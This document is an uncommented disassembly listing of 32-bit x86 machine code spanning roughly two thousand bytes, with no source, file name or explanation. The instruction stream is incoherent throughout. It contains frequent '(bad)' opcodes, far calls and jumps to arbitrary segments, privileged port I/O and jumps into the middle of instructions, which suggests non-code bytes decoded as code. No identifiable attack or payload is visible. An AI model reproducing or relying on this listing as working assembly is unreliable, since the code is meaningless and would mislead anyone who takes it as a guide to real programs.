  4037b7:	ficom  DWORD PTR [ebp-0x1cb024ae]
  4037bd:	call   0x4306:0xb398dab7
  4037c4:	shl    DWORD PTR [eax+0x54],1
  4037c7:	jb     0x4037d7
  4037c9:	jge    0x40383c
  4037cb:	push   0x55404146
  4037d0:	ret    
  4037d1:	mov    bl,0x49
  4037d3:	fwait
  4037d4:	xor    al,0xa3
  4037d6:	jbe    0x4037b0
  4037d8:	mov    dl,0x4d
  4037da:	(bad)
  4037de:	push   edi
  4037df:	push   esi
  4037e0:	dec    esp
  4037e1:	mov    BYTE PTR [eax],cl
  4037e3:	adc    edx,0x9d108b49
  4037e9:	push   esi
  4037ea:	sub    edx,DWORD PTR [esi-0x60b88724]
  4037f0:	or     eax,0xc4a0a825
  4037f5:	loopne 0x4037fa
  4037f7:	not    DWORD PTR [ebp+0x11]
  4037fa:	jb     0x4037a1
  4037fc:	ret    0xeb0b
  4037ff:	sub    ch,cl
  403801:	mov    ecx,0xd22fef19
  403806:	mov    edi,DWORD PTR [ecx+0x506f8840]
  40380c:	(bad)
  403810:	jg     0x4037bd
  403812:	jo     0x403870
  403814:	call   0x7475434e
  403819:	scas   al,BYTE PTR es:[edi]
  40381a:	das    
  40381b:	pushf  
  40381c:	add    DWORD PTR [ebp-0x23478fdf],0xffffffd8
  403823:	(bad)  
  403825:	es add eax,0xfe20ccb1
  40382b:	mov    bh,0x4d
  40382d:	dec    eax
  40382e:	mov    ecx,0xbeff7a60
  403833:	adc    DWORD PTR gs:[ebx-0x58],ebp
  403837:	(bad)  
  403838:	xchg   ebp,eax
  403839:	cmp    esi,DWORD PTR [ebx]
  40383b:	sbb    DWORD PTR [ebp+0x66],0xec072621
  403842:	and    DWORD PTR [ebx+ebx*4+0x7f7fb9d5],0x32
  40384a:	adc    eax,0xc914d21b
  40384f:	xchg   ebx,eax
  403850:	or     eax,0xca4bae40
  403855:	popf   
  403856:	pop    esi
  403857:	cmp    eax,DWORD PTR [edi]
  403859:	inc    edx
  40385a:	rcr    BYTE PTR [ebx+ebx*4],0xd0
  40385e:	popf   
  40385f:	jle    0x4038d7
  403861:	ror    DWORD PTR [ecx+0x17],0x6e
  403865:	xchg   ebx,eax
  403866:	sbb    dl,BYTE PTR [ecx+0x7f]
  403869:	loope  0x403805
  40386b:	jns    0x4038d5
  40386d:	adc    al,0x24
  40386f:	mov    ?,WORD PTR [ebx+0x1dd7edf6]
  403875:	push   ebx
  403876:	cdq    
  403877:	call   0x4094:0x4253ff85
  40387e:	and    ah,BYTE PTR [edi]
  403880:	inc    edx
  403881:	inc    eax
  403882:	retf   0x63c5
  403885:	in     eax,dx
  403886:	push   0xb521c86a
  40388b:	aas    
  40388c:	pop    esi
  40388d:	and    al,0x14
  40388f:	mov    ss,WORD PTR [edx-0x7a7281e8]
  403895:	idiv   ch
  403897:	int3   
  403898:	push   es
  403899:	jno    0x40381b
  40389b:	jno    0x403907
  40389d:	pop    edi
  40389e:	sbb    DWORD PTR [esi-0x3],0x50df0532
  4038a5:	adc    al,0x79
  4038a7:	call   0x64a9:0x6bb54da4
  4038ae:	(bad)  
  4038b0:	test   BYTE PTR [ecx],dl
  4038b2:	loop   0x403925
  4038b4:	pop    es
  4038b5:	sub    eax,0xffffffdd
  4038b8:	shr    BYTE PTR ss:[esi],0xc
  4038bc:	dec    edx
  4038bd:	cmp    BYTE PTR [ebx+ebp*2],ah
  4038c0:	popf   
  4038c1:	pop    edx
  4038c2:	or     dh,BYTE PTR [eax-0x3ad8456d]
  4038c8:	in     eax,dx
  4038c9:	dec    ebp
  4038ca:	stos   DWORD PTR es:[edi],eax
  4038cb:	dec    ebp
  4038cc:	sbb    BYTE PTR [ecx+0xab06015],0xc7
  4038d3:	xchg   ecx,eax
  4038d4:	mov    ds:0xac0d182b,eax
  4038d9:	jo     0x40391e
  4038db:	xor    DWORD PTR [edi],edx
  4038dd:	into   
  4038de:	add    BYTE PTR ds:0xb9334230,ah
  4038e4:	xchg   WORD PTR [edx+0x54],bx
  4038e8:	scas   eax,DWORD PTR es:[edi]
  4038e9:	ja     0x403933
  4038eb:	push   edi
  4038ec:	es out dx,eax
  4038ee:	ins    BYTE PTR es:[edi],dx
  4038ef:	clc    
  4038f0:	and    al,0x39
  4038f2:	aad    0xe4
  4038f4:	adc    eax,0x9aec29b2
  4038f9:	test   DWORD PTR [ebp+0x4b6a6c9e],edi
  4038ff:	mov    BYTE PTR [ebx],al
  403901:	jl     0x4038e0
  403903:	push   ds
  403904:	or     al,0x38
  403906:	je     0x4038b1
  403908:	sub    DWORD PTR [ebx],ebx
  40390a:	ins    BYTE PTR es:[edi],dx
  40390b:	inc    ebx
  40390c:	cld    
  40390d:	ret    
  40390e:	cmc    
  40390f:	pop    ds
  403910:	cdq    
  403911:	inc    ecx
  403912:	out    dx,eax
  403913:	mov    ah,0x41
  403915:	sahf   
  403916:	test   BYTE PTR [edx],al
  403918:	es xchg esi,eax
  40391a:	adc    al,0xe5
  40391c:	sub    al,0xbd
  40391e:	scas   eax,DWORD PTR es:[edi]
  40391f:	or     eax,0xb01fcc8e
  403924:	icebp  
  403925:	adc    DWORD PTR [eax+esi*4+0x27],edx
  403929:	and    BYTE PTR [ebx+0x30],ah
  40392c:	call   0x6f0f34d0
  403931:	(bad)  
  403932:	fxch   st(5)
  403934:	stc    
  403935:	inc    edi
  403936:	mov    eax,0xb6e225b2
  40393b:	jmp    0xf9b029f3
  403940:	sbb    BYTE PTR [edi+edi*8-0x39],ah
  403944:	ss and al,0xd3
  403947:	mov    DWORD PTR [ecx-0x4f],0x42db9835
  40394e:	ja     0x403994
  403950:	sbb    BYTE PTR [esi-0x74],cl
  403953:	dec    edi
  403954:	mov    edx,ecx
  403956:	add    eax,DWORD PTR [ecx+0x3d]
  403959:	icebp  
  40395a:	fistp  QWORD PTR [ebx+0x63d1c02]
  403960:	sub    BYTE PTR [eax-0x2b],bl
  403963:	sub    eax,0x5b8450af
  403968:	lods   al,BYTE PTR ds:[esi]
  403969:	(bad)  
  40396b:	push   ss
  40396c:	clc    
  40396d:	ins    BYTE PTR es:[edi],dx
  40396e:	sub    bl,dh
  403970:	xor    BYTE PTR [eax+0x3e],cl
  403973:	cmp    esi,ebp
  403975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403976:	or     eax,0xc139af08
  40397b:	jmp    0x403985
  40397d:	stos   DWORD PTR es:[edi],eax
  40397e:	or     BYTE PTR [esi+0x6f],cl
  403981:	push   eax
  403982:	ins    DWORD PTR es:[edi],dx
  403983:	inc    ecx
  403984:	and    edx,DWORD PTR [edi+0x63cb72f8]
  40398a:	push   ds
  40398b:	adc    al,BYTE PTR [ebx-0x71]
  40398e:	jp     0x40397b
  403990:	popf   
  403991:	xchg   BYTE PTR ds:[ecx],bh
  403994:	jecxz  0x4039ea
  403996:	call   0x19b0:0x1f119606
  40399d:	cli    
  40399e:	in     eax,dx
  40399f:	ret    0x5c71
  4039a2:	add    DWORD PTR [eax],0xded24fd4
  4039a8:	or     al,0x5b
  4039aa:	out    0x1,eax
  4039ac:	dec    esi
  4039ad:	stos   BYTE PTR es:[edi],al
  4039ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039af:	(bad)  
  4039b0:	stc    
  4039b1:	lods   al,BYTE PTR ds:[esi]
  4039b2:	inc    bh
  4039b4:	cmp    ax,WORD PTR [ebp+0x2e]
  4039b8:	js     0x403a2d
  4039ba:	(bad)  
  4039bb:	jl     0x403a3b
  4039bd:	test   BYTE PTR [edi+0x37ab20c0],dh
  4039c3:	jecxz  0x40397b
  4039c5:	lock loope 0x4039ef
  4039c8:	pop    es
  4039c9:	push   esi
  4039ca:	popf   
  4039cb:	repnz xchg bh,cl
  4039ce:	and    BYTE PTR [ebp+0x3683e3b4],0x9e
  4039d5:	sbb    BYTE PTR [ebx+edx*1+0x523e8c6a],al
  4039dc:	pop    ds
  4039dd:	mov    ebp,0xf85bc0fc
  4039e2:	shl    DWORD PTR [esi+esi*4],0x64
  4039e6:	dec    eax
  4039e7:	pop    ebx
  4039e8:	scas   eax,DWORD PTR es:[di]
  4039ea:	clc    
  4039eb:	dec    edi
  4039ec:	mov    dl,0xf3
  4039ee:	scas   eax,DWORD PTR es:[edi]
  4039ef:	popf   
  4039f0:	popf   
  4039f1:	mov    ebx,0x7588f25a
  4039f6:	dec    esi
  4039f7:	es fmul st,st(2)
  4039fa:	pop    es
  4039fb:	dec    ebx
  4039fc:	les    edi,FWORD PTR [eax-0x56]
  4039ff:	(bad)  
  403a00:	mov    ch,0x1b
  403a02:	outs   dx,DWORD PTR ds:[esi]
  403a03:	mov    ebx,0x49073fbb
  403a08:	mov    dl,ch
  403a0a:	push   esi
  403a0b:	int3   
  403a0c:	mov    al,ds:0x1e7f5501
  403a11:	repz popa 
  403a13:	(bad)  
  403a14:	loopne 0x40399e
  403a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a17:	pop    ebx
  403a18:	int3   
  403a19:	dec    esp
  403a1a:	mov    eax,ds:0x7f30256f
  403a1f:	add    ch,al
  403a21:	aaa    
  403a22:	pushf  
  403a23:	jnp    0x4039d0
  403a25:	mov    al,0xc4
  403a27:	ffreep st(2)
  403a29:	mov    BYTE PTR [esi+0xa],ah
  403a2c:	xor    esi,ecx
  403a2e:	cwde   
  403a2f:	mov    esp,0x9d7bf0f3
  403a34:	fisttp DWORD PTR [edx+0x20]
  403a37:	push   edx
  403a38:	mov    DWORD PTR [ebp+0x3f051113],0xbc8ab7a4
  403a42:	pop    edi
  403a43:	mov    eax,0x366ca936
  403a48:	pop    es
  403a49:	jl     0x403ab3
  403a4b:	mov    esp,0xebbce4c8
  403a50:	dec    eax
  403a51:	push   ebp
  403a52:	jno    0x403a17
  403a54:	shr    DWORD PTR [edi+ebp*2+0x22c20192],cl
  403a5b:	push   ebp
  403a5c:	call   0x1e75ece2
  403a61:	push   0x43
  403a63:	addr16 sbb eax,0x85d15d6b
  403a69:	jmp    0xf2104049
  403a6e:	lock and eax,0x96f96989
  403a74:	jmp    0xe219:0x2044eba2
  403a7b:	jmp    FWORD PTR [edi-0x4a6a5516]
  403a81:	push   ds
  403a82:	jno    0x403a4f
  403a84:	popf   
  403a85:	lods   eax,DWORD PTR ds:[esi]
  403a86:	inc    edx
  403a87:	or     dh,ah
  403a89:	fimul  WORD PTR [esi]
  403a8b:	push   edi
  403a8c:	jecxz  0x403a50
  403a8e:	adc    ch,dl
  403a90:	(bad)  [ecx+0x3c]
  403a93:	mov    dl,0x82
  403a95:	push   ebp
  403a96:	clc    
  403a97:	push   0xad3796fb
  403a9c:	mov    bl,0x59
  403a9e:	cmp    BYTE PTR [edx+0x1742c984],al
  403aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa5:	out    0x49,al
  403aa7:	adc    BYTE PTR [edi],dl
  403aa9:	or     BYTE PTR [ecx+ebx*2],bl
  403aac:	mov    BYTE PTR [ecx-0x10e0a0ed],al
  403ab2:	inc    eax
  403ab3:	mov    esi,0x192b4b19
  403ab8:	sti    
  403ab9:	loopne 0x403ae0
  403abb:	adc    DWORD PTR [esi-0x5c],eax
  403abe:	repnz sbb BYTE PTR [eax],0xa1
  403ac2:	in     eax,0x94
  403ac4:	adc    BYTE PTR [ebx+0x4d06385d],dh
  403aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403acb:	push   ds
  403acc:	sub    eax,0x477bba2b
  403ad1:	push   0x8033d4f2
  403ad6:	sub    DWORD PTR [edi+edx*4-0x3e],esi
  403ada:	mov    DWORD PTR [esi],0xcb3bd85b
  403ae0:	cmp    eax,0x8f3fd54e
  403ae5:	test   al,0xe2
  403ae7:	sahf   
  403ae8:	push   ebp
  403ae9:	adc    esp,0x44957ca8
  403aef:	push   esi
  403af0:	rcr    BYTE PTR [ebp-0x7c],0xb8
  403af4:	pop    esp
  403af5:	cmc    
  403af6:	and    al,BYTE PTR [edi]
  403af8:	mov    ah,0x61
  403afa:	test   eax,0x8ecc543d
  403aff:	clc    
  403b00:	dec    ebp
  403b01:	and    ebx,eax
  403b03:	ins    DWORD PTR es:[edi],dx
  403b04:	add    eax,0x21311ea2
  403b09:	adc    BYTE PTR [esi+esi*8],ch
  403b0c:	test   DWORD PTR [edx+0x417c1e46],eax
  403b12:	xchg   ebp,eax
  403b13:	pop    ebx
  403b14:	dec    esp
  403b15:	lock (bad) 
  403b17:	pop    edx
  403b18:	fiadd  WORD PTR [edx-0x46]
  403b1b:	dec    ecx
  403b1c:	(bad)  
  403b1d:	jmp    0x403af8
  403b1f:	pop    ecx
  403b20:	das    
  403b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b22:	push   0x270de3c2
  403b27:	sub    ebx,0x4a097893
  403b2d:	inc    esp
  403b2e:	push   edi
  403b2f:	dec    edx
  403b30:	inc    ebp
  403b31:	je     0x403b03
  403b33:	pop    edx
  403b34:	mov    bl,0xb3
  403b36:	inc    esi
  403b37:	xchg   BYTE PTR [ecx],cl
  403b39:	jp     0x403b54
  403b3b:	adc    ebx,DWORD PTR [ecx-0x239320d7]
  403b41:	push   edx
  403b42:	sub    al,0xc1
  403b44:	cs add al,0xa1
  403b47:	pop    edx
  403b48:	pop    ebp
  403b49:	int    0x4e
  403b4b:	int3   
  403b4c:	dec    edx
  403b4d:	addr16 pop ebx
  403b4f:	xor    bl,BYTE PTR [edx-0x2be177b0]
  403b55:	inc    edx
  403b56:	test   al,0x82
  403b58:	mov    eax,0xa56516b7
  403b5d:	mov    dh,BYTE PTR [ebx+ebx*1+0xe7963b3]
  403b64:	ss hlt 
  403b66:	imul   ebp,DWORD PTR ds:0xcbf8808d,0xffffffd5
  403b6d:	mov    al,0x4
  403b6f:	jae    0x403bba
  403b71:	push   edx
  403b72:	inc    edx
  403b73:	pop    edx
  403b74:	test   ecx,ebx
  403b76:	xor    al,0xe1
  403b78:	pop    DWORD PTR [edx+0xf]
  403b7b:	xchg   ebp,eax
  403b7c:	jmp    0x882c3e8c
  403b81:	lods   eax,DWORD PTR ds:[esi]
  403b82:	loopne 0x403bf9
  403b84:	adc    esp,ebp
  403b86:	pop    ecx
  403b87:	adc    DWORD PTR [esi+ebp*1+0x5a],edi
  403b8b:	mov    esp,0x327ab3a0
  403b90:	push   0x5320c841
  403b95:	xor    DWORD PTR [edx-0x17],edx
  403b98:	dec    esi
  403b99:	fst    st(4)
  403b9b:	fidiv  WORD PTR [ecx+eax*2-0x3f]
  403b9f:	push   esi
  403ba0:	adc    ebx,esi
  403ba2:	fwait
  403ba3:	into   
  403ba4:	add    ebx,esp
  403ba6:	aaa    
  403ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ba8:	hlt    
  403ba9:	ds xor ecx,edi
  403bac:	xor    cl,BYTE PTR [ebx]
  403bae:	cs pop esi
  403bb0:	or     ah,ah
  403bb2:	sbb    bl,BYTE PTR [ebx+0x4c]
  403bb5:	and    edx,DWORD PTR [ecx]
  403bb7:	push   ds
  403bb8:	imul   eax,edx,0xffffffa9
  403bbb:	sbb    eax,DWORD PTR [edx+0x54]
  403bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bbf:	pop    ebp
  403bc0:	(bad)  
  403bc1:	test   eax,0x22b0aadd
  403bc6:	fwait
  403bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bc8:	push   es
  403bc9:	lea    ebx,[eax+0x1a]
  403bcc:	loope  0x403bfa
  403bce:	fld    TBYTE PTR [edx]
  403bd0:	retf   
  403bd1:	sbb    eax,0x66865672
  403bd6:	retf   0xaa0e
  403bd9:	ret    
  403bda:	mov    bl,0x12
  403bdc:	lea    edi,[edi]
  403bde:	dec    ecx
  403bdf:	test   DWORD PTR [edi-0x18],eax
  403be2:	cwde   
  403be3:	daa    
  403be4:	and    al,0x7a
  403be6:	dec    ecx
  403be7:	mov    ecx,ss
  403be9:	aam    0x67
  403beb:	iret   
  403bec:	mov    ebx,0xeb9835e4
  403bf1:	out    dx,al
  403bf2:	jne    0x403c09
  403bf4:	mov    ebp,0x41049130
  403bf9:	mov    ds:0xd0ffd16f,eax
  403bfe:	jmp    0x53e0:0x7512ef71
  403c05:	cwde   
  403c06:	iret   
  403c07:	cmp    al,dh
  403c09:	pop    ebp
  403c0a:	sub    dl,BYTE PTR cs:[esi+0x72]
  403c0e:	pop    ebx
  403c0f:	push   ds
  403c10:	stc    
  403c11:	mov    eax,ds:0x3797f0de
  403c16:	je     0x403c33
  403c18:	dec    ebx
  403c19:	sbb    al,BYTE PTR [ebp-0x25]
  403c1c:	cs jne 0x403bcd
  403c1f:	fisttp WORD PTR [edx+0x9]
  403c22:	(bad)  
  403c23:	sbb    BYTE PTR [edi-0x5f],cl
  403c26:	pop    ecx
  403c27:	adc    BYTE PTR [ecx-0xe],dh
  403c2a:	and    al,0x75
  403c2c:	jle    0x403c69
  403c2e:	sar    DWORD PTR [ebx-0xa],cl
  403c31:	mov    al,0xaf
  403c33:	test   BYTE PTR [edx-0x70],ch
  403c36:	xor    eax,0xe811c8e1
  403c3b:	cmp    al,0x54
  403c3d:	cmc    
  403c3e:	fmul   QWORD PTR [edi+0x574b1bcf]
  403c44:	jge    0x403cc4
  403c46:	push   es
  403c47:	(bad)
  403c4b:	xchg   DWORD PTR [edx-0x2],edi
  403c4e:	xchg   edi,eax
  403c4f:	or     ecx,edx
  403c51:	ror    DWORD PTR ds:0xe502c6e2,0x83
  403c58:	enter  0xa62f,0x52
  403c5c:	mov    gs,WORD PTR [ebp+0x6360f5cb]
  403c62:	sub    DWORD PTR [ecx],esi
  403c64:	rol    DWORD PTR [ecx+0x53],0x9e
  403c68:	jmp    0x403c70
  403c6a:	sbb    al,0xc7
  403c6c:	xor    DWORD PTR [ecx-0x2a],0x1f97bce0
  403c73:	sub    BYTE PTR [esi+0x1f67103f],dl
  403c79:	inc    esi
  403c7a:	jle    0x403cc1
  403c7c:	mov    edi,0xae569c63
  403c81:	cmp    BYTE PTR [eax+ebp*8-0x43ec56bc],ch
  403c88:	(bad)  
  403c89:	fiadd  WORD PTR [edi]
  403c8b:	shr    eax,1
  403c8d:	and    BYTE PTR [ebx-0x35],ah
  403c90:	or     ch,BYTE PTR [esi-0x7a]
  403c93:	clc    
  403c94:	jbe    0x403d07
  403c96:	test   BYTE PTR ds:0xf1a2e14,ch
  403c9c:	mov    eax,ds:0x7d4808b3
  403ca1:	pop    ebx
  403ca2:	dec    eax
  403ca3:	stos   BYTE PTR es:[edi],al
  403ca4:	mov    ebp,0xc7216aa3
  403ca9:	and    eax,0xe420eed3
  403cae:	add    DWORD PTR [ebp+0x4c],0x2e3575e2
  403cb5:	cld    
  403cb6:	mov    dh,0x4d
  403cb8:	add    DWORD PTR [ebx+0x63e13b8e],ebx
  403cbe:	cs retf 0xc0e7
  403cc2:	loop   0x403c95
  403cc4:	dec    ebx
  403cc5:	jge    0x403cb6
  403cc7:	pop    ecx
  403cc8:	inc    edi
  403cc9:	test   al,0xa7
  403ccb:	fstp   TBYTE PTR [ebp-0x43]
  403cce:	mov    ebp,0x9beda14d
  403cd3:	inc    ebp
  403cd4:	push   edi
  403cd5:	into   
  403cd6:	popf   
  403cd7:	cli    
  403cd8:	scas   al,BYTE PTR es:[edi]
  403cd9:	cmp    al,0x48
  403cdb:	and    edx,ebp
  403cdd:	(bad)  
  403cde:	popaw  
  403ce0:	ror    dh,1
  403ce2:	inc    edx
  403ce3:	test   BYTE PTR [edx+0x54044165],bl
  403ce9:	xchg   ebx,eax
  403cea:	popa   
  403ceb:	and    eax,0xff2f5ec1
  403cf0:	repnz int 0x2e
  403cf3:	aam    0xc7
  403cf5:	mov    ch,0x42
  403cf7:	loope  0x403ca6
  403cf9:	xor    al,0xa2
  403cfc:	push   ebp
  403cfd:	aam    0x46
  403cff:	sbb    DWORD PTR [esi-0x36],ebp
  403d02:	int3   
  403d03:	mov    al,0x25
  403d05:	cmp    ecx,DWORD PTR [ebp+0xbe18c9e]
  403d0b:	test   al,0xa3
  403d0d:	mov    ebp,DWORD PTR [eax]
  403d0f:	repnz cmp bh,dl
  403d12:	sbb    ecx,DWORD PTR ds:0xc6c3180d
  403d18:	push   cs
  403d19:	test   eax,0xa7db59e0
  403d1e:	pop    edx
  403d1f:	out    dx,al
  403d20:	dec    ebx
  403d21:	mov    edx,0x51f8805d
  403d26:	das    
  403d27:	mov    ds:0xcb471283,al
  403d2c:	and    eax,0x8855862f
  403d31:	mov    bh,cl
  403d33:	add    eax,0xed6e9d54
  403d38:	ret    0x542d
  403d3b:	sub    ebx,DWORD PTR [eax-0x47]
  403d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d3f:	ins    DWORD PTR es:[edi],dx
  403d40:	cld    
  403d41:	jns    0x403d88
  403d43:	cdq    
  403d44:	cdq    
  403d45:	jmp    0x7aea7774
  403d4a:	ss xchg ebp,eax
  403d4c:	std    
  403d4d:	ja     0x403d46
  403d4f:	aad    0xa6
  403d51:	add    al,0x47
  403d53:	mov    ah,0x3
  403d55:	es es push edi
  403d58:	jb     0x403dcf
  403d5a:	dec    edi
  403d5b:	retf   0xae76
  403d5e:	fwait
  403d5f:	pop    edi
  403d60:	push   edx
  403d61:	retf   
  403d62:	jecxz  0x403daa
  403d64:	imul   BYTE PTR [ecx-0x5aa07fa6]
  403d6a:	popa   
  403d6b:	mov    bl,0xf
  403d6d:	add    BYTE PTR [edx+ecx*2+0x43],bl
  403d71:	sbb    DWORD PTR [ecx-0xc],eax
  403d74:	test   eax,0xf4c3a7aa
  403d79:	stos   BYTE PTR es:[edi],al
  403d7a:	sub    DWORD PTR [eax+edi*1+0x2d969499],esi
  403d81:	mov    esp,0xa6484269
  403d86:	cld    
  403d87:	push   ds
  403d88:	jecxz  0x403d42
  403d8a:	xor    ah,cl
  403d8c:	jmp    0x4e991fc
  403d91:	int3   
  403d92:	ret    0xd113
  403d95:	fcomp  QWORD PTR [edi-0x68c0d8f7]
  403d9b:	or     eax,0xcb157077
  403da0:	xchg   BYTE PTR [ebp-0x77],ah
  403da3:	and    dh,BYTE PTR [edi]
  403da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da6:	sub    ah,BYTE PTR [ebx-0x1b908c79]
  403dac:	adc    eax,0xcc495f8a
  403db1:	pop    ebx
  403db2:	fucomp st(6)
  403db4:	(bad)  
  403db5:	dec    ecx
  403db6:	aaa    
  403db7:	mov    WORD PTR [ebp+0x70],ss
  403dba:	sbb    al,0x32
  403dbc:	ins    DWORD PTR es:[edi],dx
  403dbd:	out    dx,al
  403dbe:	push   esi
  403dbf:	rcr    BYTE PTR [esi],cl
  403dc1:	lods   eax,DWORD PTR ds:[esi]
  403dc2:	jmp    0x403e07
  403dc4:	mov    ch,0x28
  403dc6:	pop    ds
  403dc7:	pop    ds
  403dc8:	into   
  403dc9:	mov    ah,0x26
  403dcb:	call   0x5941de03
  403dd0:	cmp    ah,BYTE PTR ds:0x87606e2b
  403dd6:	adc    ecx,DWORD PTR [bx+0x2c]
  403dda:	inc    esp
  403ddb:	stos   DWORD PTR es:[edi],eax
  403ddc:	out    0xbb,eax
  403dde:	mov    ss,WORD PTR [eax]
  403de0:	inc    esi
  403de1:	lahf   
  403de2:	aas    
  403de3:	cmc    
  403de4:	loop   0x403e05
  403de6:	aam    0x18
  403de8:	inc    edx
  403de9:	jg     0x403dd4
  403deb:	add    eax,0xb5d5f5d4
  403df0:	xor    ebx,eax
  403df2:	loopne 0x403e0f
  403df4:	stos   DWORD PTR es:[edi],eax
  403df5:	jl     0x403e4d
  403df7:	add    al,0x80
  403df9:	nop
  403dfa:	adc    al,0xbf
  403dfc:	cmp    dl,BYTE PTR [esi+0x46]
  403dff:	add    DWORD PTR [ebx],0xe157be3e
  403e05:	inc    edx
  403e06:	push   0xa63335e
  403e0b:	mov    bl,0x4b
  403e0d:	call   0x23e597e4
  403e12:	retf   
  403e13:	and    al,0x5
  403e15:	div    BYTE PTR [esi-0x36]
  403e18:	adc    eax,0x7a3b1f27
  403e1d:	xor    esp,DWORD PTR [ebx-0x11a487b2]
  403e23:	shl    ecx,cl
  403e25:	mov    al,dl
  403e27:	(bad)  
  403e28:	mov    ds:0xe717f8bc,al
  403e2d:	cmp    ecx,DWORD PTR [ebx+0x7b]
  403e30:	mov    cl,0xbd
  403e32:	cmp    esi,DWORD PTR [edx-0x1f]
  403e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e36:	mov    dh,dh
  403e38:	and    bh,BYTE PTR [ebx-0x608cc78e]
  403e3e:	xor    dl,BYTE PTR [edx*8+0xaad9f2a]
  403e45:	mov    edx,esp
  403e47:	ror    DWORD PTR [ebx],1
  403e49:	(bad)  
  403e4a:	nop
  403e4b:	and    eax,0x14b00b05
  403e50:	retf   0x270f
  403e53:	lods   eax,DWORD PTR ds:[esi]
  403e54:	jnp    0x403e49
  403e56:	icebp  
  403e57:	aad    0xcd
  403e59:	test   al,0x27
  403e5b:	jb     0x403e37
  403e5d:	cs jbe 0x403ecd
  403e60:	jmp    0xd2dceff2
  403e65:	cmp    eax,0x4d8d7f37
  403e6a:	pop    ds
  403e6b:	jg     0x403e5f
  403e6d:	pop    ecx
  403e6e:	rol    BYTE PTR [edi-0xe],cl
  403e71:	lods   eax,DWORD PTR ds:[esi]
  403e72:	push   0x4a06fd3c
  403e77:	(bad)  
  403e78:	cld    
  403e79:	push   0xd0582c68
  403e7e:	cli    
  403e7f:	and    esi,DWORD PTR [ecx+ecx*1+0x47]
  403e83:	in     al,dx
  403e84:	sub    BYTE PTR [esi-0x6e],bh
  403e87:	rol    edx,1
  403e89:	xchg   ebx,eax
  403e8a:	dec    edi
  403e8b:	xchg   edi,eax
  403e8c:	scas   eax,DWORD PTR es:[edi]
  403e8d:	add    eax,0x1fb5dc7e
  403e92:	xchg   ebx,eax
  403e93:	adc    eax,0x901c0477
  403e98:	jbe    0x403e3f
  403e9a:	add    BYTE PTR [ebx-0x6f],ch
  403e9d:	pop    edi
  403e9e:	in     eax,dx
  403e9f:	imul   edi,DWORD PTR [edx+eax*2-0x4f],0x2ee0ae9e
  403ea7:	idiv   bl
  403ea9:	jg     0x403ef0
  403eab:	inc    ebx
  403eac:	push   cs
  403ead:	mov    eax,ds:0xe69ef3d0
  403eb2:	aam    0xea
  403eb4:	mov    esi,0xbde89714
  403eb9:	sub    eax,0x236762cd
  403ebe:	jo     0x403f0e
  403ec0:	add    DWORD PTR [ebp-0x6a341b4b],ecx
  403ec6:	mov    esp,0x92bb064d
  403ecb:	jo     0x403eea
  403ecd:	pushf  
  403ece:	cmp    dl,BYTE PTR [edi-0x20]
  403ed1:	adc    eax,0x6c0fb3fc
  403ed6:	mov    al,0x6a
  403ed8:	and    dl,bh
  403eda:	js     0x403e73
  403edc:	out    0x46,al
  403ede:	bound  eax,QWORD PTR [edi+esi*8-0x27]
  403ee2:	xor    ebx,DWORD PTR [eax]
  403ee4:	inc    ecx
  403ee5:	ds xchg esi,eax
  403ee7:	retf   
  403ee8:	cmp    ah,BYTE PTR [edx-0x486011de]
  403eee:	push   ds
  403eef:	lock fisttp QWORD PTR [edx+0x17]
  403ef3:	repnz sti 
  403ef5:	dec    edi
  403ef6:	adc    BYTE PTR [ecx-0x25],0xbc
  403efa:	adc    eax,0xb7c91855
  403eff:	xchg   ebx,eax
  403f00:	int    0xbd
  403f02:	int    0xc5
  403f04:	mov    ebp,0x190c57c4
  403f09:	and    bl,BYTE PTR [esi]
  403f0b:	nop
  403f0c:	adc    dh,0x51
  403f0f:	ror    BYTE PTR [ebp-0x39852a0a],1
  403f15:	adc    ch,BYTE PTR [ecx+0x33798891]
  403f1b:	dec    eax
  403f1c:	fist   WORD PTR [ebp+0x262eef10]
  403f22:	inc    ebp
  403f23:	sti    
  403f24:	test   ebx,esi
  403f26:	add    al,0x14
  403f28:	push   0x3cc390c1
  403f2d:	jg     0x403f7d
  403f2f:	adc    al,0xb2
  403f31:	sbb    eax,DWORD PTR [ecx+0x61]
  403f34:	xchg   edx,eax
  403f35:	mov    WORD PTR [ebx],ss
  403f37:	mov    WORD PTR [edx+0x41],es
  403f3a:	push   0xffffffff
  403f3c:	ret    0x8226
  403f3f:	xchg   ecx,edx
  403f41:	push   ebx
  403f42:	rol    BYTE PTR [ebp-0x1bf84b7a],cl
  403f48:	aam    0x15
  403f4a:	div    DWORD PTR [edx+0x55d7f891]
  403f50:	sti    
  403f51:	dec    eax
  403f52:	stos   BYTE PTR es:[edi],al
  403f53:	adc    al,0x66
  403f55:	and    dl,BYTE PTR [ecx+ebx*4-0xc]
  403f59:	loope  0x403f04
  403f5b:	js     0x403f95
  403f5d:	lahf   
  403f5e:	push   edx
  403f5f:	adc    DWORD PTR [ebp+eiz*8+0x50023b2d],ebx
  403f66:	xchg   esi,eax
  403f67:	push   ecx
  403f68:	leave  
  403f69:	cwde   
  403f6a:	mov    cl,BYTE PTR [esi-0x10264a78]
  403f70:	scas   eax,DWORD PTR es:[edi]
  403f71:	aas    
  403f72:	call   0xf863:0x6384384c
  403f79:	xchg   al,bh
  403f7b:	xchg   esp,eax
  403f7c:	jg     0x403f50
  403f7e:	mov    eax,ds:0x2cb2fd4
  403f83:	xchg   esp,eax
  403f84:	inc    edi
  403f85:	(bad)  
  403f86:	imul   edi,DWORD PTR [ecx],0xffffffa9
  403f89:	jmp    0xee51:0x977318f2
  403f90:	xor    al,0x54
  403f92:	ficom  WORD PTR [esi-0x35912bb7]
  403f98:	xor    al,0x86
  403f9a:	push   esp
  403f9b:	aas    
  403f9c:	pop    es
  403f9d:	leave  
  403f9e:	sti    
